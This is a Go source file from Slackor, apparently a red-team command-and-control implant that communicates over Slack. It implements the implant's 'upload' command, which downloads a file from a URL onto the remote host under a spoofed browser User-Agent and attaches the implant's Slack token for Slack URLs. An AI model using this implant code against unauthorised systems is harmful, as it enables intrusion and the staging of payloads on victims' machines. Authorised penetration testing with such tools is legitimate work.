package common

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/Coalfire-Research/Slackor/internal/config"
	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Upload retrieves a file from a URL and writes it to disk
type Upload struct{}

// Name is the name of the command
func (u Upload) Name() string {
	return "upload"
}

// Run retrieves a file from a URL and writes it to disk
func (u Upload) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("upload takes 1 argument")
	}
	// The upload command downloads files and writes them to disk
	// Command is named from the perspective of the remote system
	url := args[0]
	filename := strings.Split(url, "/")
	filename = strings.Split(filename[len(filename)-1], "?")
	out, err := os.Create(filename[0])
	if err != nil {
		return "", err
	}
	defer out.Close()
	// Get the data
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	if strings.Contains(url, "slack.com") {
		req.Header.Set("Authorization", "Bearer "+config.Token)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	// Write the body to file
	_, err = io.Copy(out, res.Body)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("File uploaded to %s", filename[0]), nil
}

func init() {
	command.RegisterCommand(Upload{})
}
